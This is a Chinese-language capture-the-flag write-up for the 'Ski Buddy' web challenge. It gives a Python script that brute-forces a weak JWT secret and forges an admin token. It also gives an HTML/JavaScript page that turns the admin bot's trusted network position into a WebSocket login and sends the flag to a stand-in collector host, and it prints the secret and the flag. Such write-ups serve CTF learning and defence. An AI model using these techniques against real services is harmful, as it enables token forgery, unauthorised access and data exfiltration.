# Ski Buddy

## 题目简述

应用通过 WebSocket 向每个连接发送一个 HS256 签名的访客 JWT。客户端可以回传任意 token 做 `auth`；若 token 中 `username == "admin"`，且 WebSocket 的来源 IP 等于后台审核容器 `ADMIN_HOST`，服务才发送 flag。另一个 `/submit_news` 接口会让 Puppeteer 管理员访问用户提供的任意 URL。

利用需要组合两点：JWT 密钥很弱，可由访客 token 离线爆破；管理员 bot 又能被诱导加载攻击者页面，并从受信任容器内建立 WebSocket。这样既能提供伪造的 admin token，也能满足来源 IP 检查。

## 解题过程

先自行连接 `/ws`，保存服务器发来的 `type: "token"` 消息。该 token 是已知明文 HS256 样本，可以对候选词典离线验证：

```python
import jwt

guest_token = "从 WebSocket 收到的访客 token"

with open("wordlist.txt", encoding="utf-8", errors="ignore") as words:
    for line in words:
        candidate = line.strip()
        if not candidate:
            continue
        try:
            jwt.decode(guest_token, candidate, algorithms=["HS256"])
        except jwt.InvalidTokenError:
            continue
        print("JWT secret:", candidate)
        secret = candidate
        break

admin_token = jwt.encode(
    {"username": "admin"},
    secret,
    algorithm="HS256",
)
print(admin_token)
```

公开部署配置中的密钥是弱口令 `t0ilet`，与离线爆破结果一致。随后把以下页面放在攻击者可访问的站点上。管理员浏览器执行脚本后，从 Docker 内网直接连接应用；服务看到的来源地址就是预先解析出的后台容器地址。页面收到 flag 消息后再发到攻击者的收集端点：

```html
<!doctype html>
<meta charset="utf-8">
<script>
const token = "PASTE_FORGED_ADMIN_JWT";
const ws = new WebSocket("ws://ski-buddy-app:8000/ws");

ws.onopen = () => {
  ws.send(JSON.stringify({type: "auth", token}));
};

ws.onmessage = event => {
  const message = JSON.parse(event.data);
  if (message.type === "flag") {
    const url = "https://ATTACKER.example/collect?data=" +
                encodeURIComponent(event.data);
    new Image().src = url;
  }
};
</script>
```

最后把该页面 URL 提交给 `/submit_news`。bot 没有限制访问目标，WebSocket 服务也没有校验 `Origin`；伪造 token 与受信任网络位置同时满足条件，得到：

```text
grey{skibidi_toilet_2ea989edfabfe44f526d7edd0dd8df27}
```

完整利用链可与[公开参赛者题解](https://sl-lee.github.io/CTF-Writeups/NUS-Greyhats-Welcome-CTF-2025)交叉核对；正文已保留弱 JWT 密钥、管理员网络位置、WebSocket 认证和数据回传四个必要环节，外链仅用于来源追溯。

## 方法总结

- 核心技巧：从服务器发放的访客 JWT 离线破解弱 HS256 密钥，再借管理员 bot 的网络位置完成受信任来源 WebSocket 认证。
- 识别信号：公开签名样本、弱 JWT secret、用户可控的 bot URL、跨源 WebSocket 无 `Origin` 校验，以及基于来源 IP 的二次授权。
- 复用要点：IP 检查不是身份认证；后台 bot 应限制协议、域名和内网目标，WebSocket 应校验 Origin，并使用高熵密钥和服务端会话状态。外部收集 URL 只是传输通道，真正必要的机制已完整写入正文。
